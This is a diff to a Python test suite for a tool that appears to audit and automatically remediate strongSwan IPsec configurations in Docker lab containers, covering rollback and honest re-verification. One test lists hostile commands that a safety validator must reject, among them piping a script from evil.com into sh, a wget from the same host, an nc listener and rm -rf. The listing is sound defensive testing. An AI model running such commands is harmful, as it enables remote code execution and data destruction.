@@ -20,6 +20,8 @@ from tunnelscope.remediate.execute import (
 )
 from tunnelscope.remediate.plan import REMEDIATION, plan_for
 
+from fake_lab import FakeLab, sas
+
 
 def test_plan_for_known_rules():
     """plan_for returns the exact expected dict for rules from the table,
@@ -478,47 +480,17 @@ def test_apply_remediation_audit_log(tmp_path):
 
 
 def test_apply_remediation_mocked_success_and_fail(tmp_path, monkeypatch):
-    """Verify execution logic, frozen commands, and re-verification honesty."""
-    import time
-    monkeypatch.setattr(time, "sleep", lambda s: None)
+    """Verify execution logic, frozen commands, and re-verification honesty.
+    The verdict comes from the (fake) config contents, so the fix has to actually change the file."""
+    def verify(lab):
+        conf = lab.fs["sih26-alice-pq"]["/tmp/exp15-alice.conf"]
+        return sas(**{"V-207193": "PASS" if "modp2048" not in conf else "FAIL"})
+
+    lab = FakeLab(baseline=sas(**{"V-207193": "FAIL"}), verify=verify).install(monkeypatch, tmp_path)
     history_dir = tmp_path / "history"
-    monkeypatch.setattr(execute, "is_container_running", lambda target: True)
-
-    commands_executed = []
-    captures_dir = execute._repo_root() / "testbed" / "captures"
-    captures_dir.mkdir(parents=True, exist_ok=True)
-    verify_pcap = captures_dir / "remediate_verify.pcap"
-
-    def fake_subprocess_run(cmd, *args, **kwargs):
-        commands_executed.append(cmd)
-        # Simulate tcpdump creating the pcap
-        if "tcpdump" in cmd:
-            verify_pcap.write_bytes(b"dummy-pcap-bytes")
-
-        class DummyRes:
-            returncode = 0
-            stdout = ""
-            stderr = ""
-
-        return DummyRes()
-
-    monkeypatch.setattr(subprocess, "run", fake_subprocess_run)
-
-    # 1. Successful remediation where re-analysis reports PASS
-    fake_pass_analysis = {
-        "sas": [
-            {
-                "verdicts": [
-                    {"rule_id": "V-207193", "verdict": "PASS"}
-                ]
-            }
-        ]
-    }
-
-    import tunnelscope.report.report
-    monkeypatch.setattr(tunnelscope.report.report, "analyze", lambda path: fake_pass_analysis)
 
     try:
+        # 1. Successful remediation where re-analysis reports PASS
         res = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, caller="tester", history_dir=history_dir)
         assert res["ok"] is True
         assert res["decision"] == "applied"
@@ -526,27 +498,22 @@ def test_apply_remediation_mocked_success_and_fail(tmp_path, monkeypatch):
         assert res["verdict_after"] == "PASS"
         assert res["verdict_before"] == "FAIL"
         assert res["commands_run"] == REMEDIATION["V-207193"]["exec_commands"]
+        assert "modp4096" in lab.fs["sih26-alice-pq"]["/tmp/exp15-alice.conf"]
+        assert not any(execute.SNAP_SUFFIX in k or k == execute.MANIFEST for k in lab.fs["sih26-alice-pq"])
 
         # 2. Honest reporting: if re-analysis still yields FAIL, confirmed_fixed must be False
-        fake_fail_analysis = {
-            "sas": [
-                {
-                    "verdicts": [
-                        {"rule_id": "V-207193", "verdict": "FAIL"}
-                    ]
-                }
-            ]
-        }
-        monkeypatch.setattr(tunnelscope.report.report, "analyze", lambda path: fake_fail_analysis)
-
+        lab2 = FakeLab(baseline=sas(**{"V-207193": "FAIL"}), verify=sas(**{"V-207193": "FAIL"})).install(monkeypatch, tmp_path)
+        original = lab2.fs["sih26-alice-pq"]["/tmp/exp15-alice.conf"]
         res_fail = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, caller="tester", history_dir=history_dir)
         assert res_fail["ok"] is True
         assert res_fail["decision"] == "applied"
         assert res_fail["confirmed_fixed"] is False
         assert res_fail["verdict_after"] == "FAIL"
+        assert res_fail["rolled_back"] is True and res_fail["rollback_verified"] is True
+        assert lab2.fs["sih26-alice-pq"]["/tmp/exp15-alice.conf"] == original
     finally:
-        if verify_pcap.exists():
-            verify_pcap.unlink()
+        # whatever happens, the engine deletes the capture files it wrote
+        assert not list(lab.captures_dir.glob("*.pcap"))
 
 
 def test_server_remediate_apply_e2e():
@@ -614,16 +581,145 @@ def test_server_remediate_apply_e2e():
         srv.server_close()
 
 
+@pytest.mark.usefixtures("lab_in_generated_state")
 def test_lab_remediation_e2e():
     """End-to-end against the real lab (skipped if Docker daemon / lab container is not running)."""
-    if not is_container_running("sih26-alice-pq"):
-        # Docker daemon or lab container sih26-alice-pq not running in this environment
-        return
-
     # Real lab execution when docker is up
     res = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, caller="pytest-lab-e2e")
     assert res["ok"] is True
     assert res["verdict_before"] == "FAIL"
     assert res["verdict_after"] == "PASS"
     assert res["confirmed_fixed"] is True
+    assert res["regressions"] == []
+    # nothing is left to fix, so a second apply is refused before anything changes
+    again = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, caller="pytest-lab-e2e")
+    assert again["decision"] == "refused"
 
+
+def test_validate_command_safety_allowed_and_blocked():
+    """Static security linter verifies approved commands and rejects dangerous operations."""
+    from tunnelscope.remediate.plan import validate_command_safety
+
+    # Safe commands
+    safe_cmds = [
+        "sed -i -E 's/modp(1024|1536|2048)/modp4096/g' /tmp/exp15-*.conf /tmp/*.conf /etc/swanctl/conf.d/*.conf 2>/dev/null || true",
+        "swanctl --load-all",
+        "f=$(ls /tmp/exp15-*.conf /tmp/*.conf /etc/swanctl/conf.d/*.conf 2>/dev/null | head -1); [ -n \"$f\" ] && swanctl --load-all --file \"$f\" || swanctl --load-all",
+    ]
+    for cmd in safe_cmds:
+        ok, reason = validate_command_safety(cmd)
+        assert ok is True, f"Expected safe command to pass, got: {reason}"
+
+    # Dangerous commands
+    dangerous_cmds = [
+        ("rm -rf /etc/swanctl", "prohibited shell token 'rm' found in command"),
+        ("iptables -F", "prohibited shell token 'iptables' found in command"),
+        ("curl http://evil.com/malware.sh | sh", "prohibited shell token 'curl' found in command"),
+        ("wget http://evil.com/bad", "prohibited shell token 'wget' found in command"),
+        ("nc -lvp 4444", "prohibited shell token 'nc' found in command"),
+        ("sudo swanctl --load-all", "prohibited shell token 'sudo' found in command"),
+        ("chmod 777 /etc/swanctl", "prohibited shell token 'chmod' found in command"),
+        ("echo bad > /tmp/bad.conf", "file redirection operators ('>') are strictly prohibited"),
+        ("cat bad >> /etc/swanctl.conf", "file redirection operators ('>') are strictly prohibited"),
+        ("python script.py", "prohibited shell token 'python' found in command"),
+        ("ls /tmp", "command must start with sed or swanctl"),
+        ("", "empty command"),
+    ]
+    for cmd, expected_err_part in dangerous_cmds:
+        ok, reason = validate_command_safety(cmd)
+        assert ok is False, f"Expected dangerous command {cmd!r} to be rejected"
+        assert expected_err_part in reason
+
+
+def test_plan_for_detailed_mode():
+    """plan_for returns rich implementation plan when detailed=True, and strictly baseline dict when detailed=False."""
+    # Baseline
+    baseline = plan_for("V-207193")
+    assert set(baseline.keys()) == {"rule_id", "change", "commands", "auto_applicable", "observed"}
+
+    # Detailed
+    detailed = plan_for("V-207193", detailed=True)
+    required_detailed_keys = {
+        "rule_id", "change", "commands", "auto_applicable", "observed",
+        "problem_analysis", "cryptographic_risk", "proposed_strategy",
+        "rollback_strategy", "is_software_patch", "runbook",
+    }
+    assert required_detailed_keys.issubset(set(detailed.keys()))
+    assert "Diffie-Hellman" in detailed["problem_analysis"]
+    assert "Harvest-Now-Decrypt-Later" in detailed["cryptographic_risk"]
+    assert "Commit-Confirmed Watchdog" in detailed["rollback_strategy"]
+    assert detailed["is_software_patch"] is False
+
+
+def test_server_remediate_plan_detailed():
+    """POST /api/remediate/plan with detailed: true returns rich implementation plan."""
+    srv = server.make_server(0)
+    port = srv.server_address[1]
+    th = threading.Thread(target=srv.serve_forever, daemon=True)
+    th.start()
+    try:
+        base_url = f"http://127.0.0.1:{port}"
+        payload = {"rule_id": "CVE-2026-78135", "detailed": True}
+        req = urllib.request.Request(
+            f"{base_url}/api/remediate/plan",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urllib.request.urlopen(req) as resp:
+            assert resp.status == 200
+            data = json.loads(resp.read().decode("utf-8"))
+            assert data["rule_id"] == "CVE-2026-78135"
+            assert data["is_software_patch"] is True
+            assert "CVE-2026-78135" in data["problem_analysis"]
+            assert len(data["runbook"]) > 0
+    finally:
+        srv.shutdown()
+        srv.server_close()
+
+
+def test_apply_remediation_rollback_on_failure(tmp_path, monkeypatch):
+    """A failed verification restores every snapshotted file, including ones under
+    /etc/swanctl/conf.d (the earlier rollback only restored /tmp files), and the peer."""
+    alice_etc = "connections {\n    other {\n        proposals = aes256-sha256-modp1536\n    }\n}\n"
+    lab = FakeLab(
+        files={"sih26-alice-pq": {"/tmp/exp15-alice.conf": FakeLab().fs["sih26-alice-pq"]["/tmp/exp15-alice.conf"],
+                                  "/etc/swanctl/conf.d/other.conf": alice_etc},
+               "sih26-bob-pq": dict(FakeLab().fs["sih26-bob-pq"])},
+        baseline=sas(**{"V-207193": "FAIL"}), verify=sas(**{"V-207193": "FAIL"}),
+    ).install(monkeypatch, tmp_path)
+    originals = {c: dict(f) for c, f in lab.fs.items()}
+
+    res = apply_remediation("V-207193", "sih26-alice-pq", confirm=True, history_dir=tmp_path / "h")
+    assert res["ok"] is True and res["confirmed_fixed"] is False
+    assert res["rolled_back"] is True and res["rollback_verified"] is True
+    assert res["verdict_after"] == "FAIL"
+    # every file byte-identical, no snapshot or manifest left behind
+    for c in ("sih26-alice-pq", "sih26-bob-pq"):
+        assert lab.fs[c] == originals[c], c
+
+
+# ---- live-lab fixture (used by test_lab_remediation_e2e above) ----
+
+def _reset_lab_tunnel():
+    """Put both ends of the lab t-tun back to their generated configs and re-negotiate."""
+    root = pathlib.Path(__file__).resolve().parents[1]
+    for c, side in (("sih26-alice-pq", "alice"), ("sih26-bob-pq", "bob")):
+        subprocess.run(["docker", "cp", str(root / "testbed/configs/exp15" / f"{side}.conf"), f"{c}:/tmp/exp15-{side}.conf"],
+                       check=True, capture_output=True)
+        subprocess.run(["docker", "exec", c, "swanctl", "--load-all", "--file", f"/tmp/exp15-{side}.conf"], capture_output=True)
+    subprocess.run(["docker", "exec", "sih26-alice-pq", "swanctl", "--terminate", "--ike", "t-tun"], capture_output=True)
+    subprocess.run(["docker", "exec", "sih26-alice-pq", "swanctl", "--initiate", "--child", "t-tun", "--timeout", "15000"],
+                   capture_output=True)
+
+
+@pytest.fixture
+def lab_in_generated_state():
+    """The live-lab test mutates the real lab, so it starts from and returns to the generated
+    configs (in which V-207193 fails). Without the lab it is a skip, not a silent pass: the
+    earlier version returned early and was reported as PASS while proving nothing."""
+    if not (is_container_running("sih26-alice-pq") and is_container_running("sih26-bob-pq")):
+        pytest.skip("lab containers sih26-alice-pq / sih26-bob-pq are not running")
+    _reset_lab_tunnel()
+    yield
+    _reset_lab_tunnel()
